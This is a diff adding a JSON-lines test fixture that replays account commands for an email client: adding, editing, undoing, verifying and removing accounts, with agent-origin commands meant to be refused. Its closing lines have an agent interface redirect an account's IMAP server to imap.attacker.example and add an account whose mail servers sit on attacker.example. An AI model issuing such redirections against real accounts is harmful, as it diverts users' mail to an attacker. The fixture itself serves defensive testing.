@@ -1,0 +1,24 @@
+# Accounts: add (preset + custom), rejected inputs, edit, undo/redo (same ID), test + verify events,
+# keyring failure, confirmed removal, agents refused (user only). No passwords: logs hold no secrets.
+# Line 4's seed is 4 << 64, so the Gmail account's ID is 00000000-0000-0004-0000-000000000000.
+{"t": 1700000000000, "origin": "cli", "input": {"command": {"cmd": "add_account", "args": {"preset": "gmail", "email": "me@gmail.com", "display_name": "Personal"}}}}
+{"t": 1700000000100, "origin": "runtime", "input": {"event": {"event": "persisted", "args": {}}}}
+{"t": 1700000001000, "origin": "gui", "input": {"command": {"cmd": "add_account", "args": {"preset": "custom", "email": "me@example.org"}}}}
+{"t": 1700000002000, "origin": "gui", "input": {"command": {"cmd": "add_account", "args": {"preset": "hostinger", "email": "ME@gmail.com"}}}}
+{"t": 1700000003000, "origin": "gui", "input": {"command": {"cmd": "add_account", "args": {"preset": "custom", "email": "work@example.org", "imap": {"host": "mail.example.org", "port": 143, "security": "starttls"}, "smtp": {"host": "mail.example.org", "port": 587, "security": "starttls"}}}}}
+{"t": 1700000004000, "origin": "cli", "input": {"command": {"cmd": "update_account", "args": {"id": "00000000-0000-0004-0000-000000000000", "display_name": "Gmail"}}}}
+{"t": 1700000005000, "origin": "gui", "input": {"command": {"cmd": "undo", "args": {}}}}
+{"t": 1700000006000, "origin": "gui", "input": {"command": {"cmd": "undo", "args": {}}}}
+{"t": 1700000007000, "origin": "gui", "input": {"command": {"cmd": "redo", "args": {}}}}
+{"t": 1700000008000, "origin": "cli", "input": {"command": {"cmd": "test_account", "args": {"id": "00000000-0000-0004-0000-000000000000"}}}}
+{"t": 1700000009000, "origin": "runtime", "input": {"event": {"event": "account_verify_failed", "args": {"account": "00000000-0000-0004-0000-000000000000", "error": "no password stored in the keyring"}}}}
+{"t": 1700000010000, "origin": "runtime", "input": {"event": {"event": "account_verified", "args": {"account": "00000000-0000-0004-0000-000000000000"}}}}
+{"t": 1700000011000, "origin": "runtime", "input": {"event": {"event": "secret_failed", "args": {"account": "00000000-0000-0004-0000-000000000000", "error": "keyring locked"}}}}
+{"t": 1700000012000, "origin": "mcp", "input": {"command": {"cmd": "remove_account", "args": {"id": "00000000-0000-0004-0000-000000000000"}}}}
+{"t": 1700000013000, "origin": "mcp", "input": {"command": {"cmd": "remove_account", "args": {"id": "00000000-0000-0004-0000-000000000000", "confirm": true}}}}
+{"t": 1700000014000, "origin": "runtime", "input": {"event": {"event": "secret_deleted", "args": {"account": "00000000-0000-0004-0000-000000000000"}}}}
+{"t": 1700000015000, "origin": "cli", "input": {"command": {"cmd": "test_account", "args": {"id": "00000000-0000-0004-0000-000000000000"}}}}
+{"t": 1700000016000, "origin": "mcp", "input": {"command": {"cmd": "update_account", "args": {"id": "00000000-0000-0008-0000-000000000000", "imap": {"host": "imap.attacker.example", "port": 993, "security": "tls"}}}}}
+{"t": 1700000017000, "origin": "mcp_allow_send", "input": {"command": {"cmd": "add_account", "args": {"preset": "custom", "email": "drop@attacker.example", "imap": {"host": "imap.attacker.example", "port": 993, "security": "tls"}, "smtp": {"host": "smtp.attacker.example", "port": 465, "security": "tls"}}}}}
+{"t": 1700000018000, "origin": "gui", "input": {"command": {"cmd": "set_password", "args": {"id": "00000000-0000-0008-0000-000000000000", "password": "hunter2"}}}}
+{"t": 1700000019000, "origin": "mcp", "input": {"command": {"cmd": "set_password", "args": {"id": "00000000-0000-0008-0000-000000000000", "password": "hunter2"}}}}
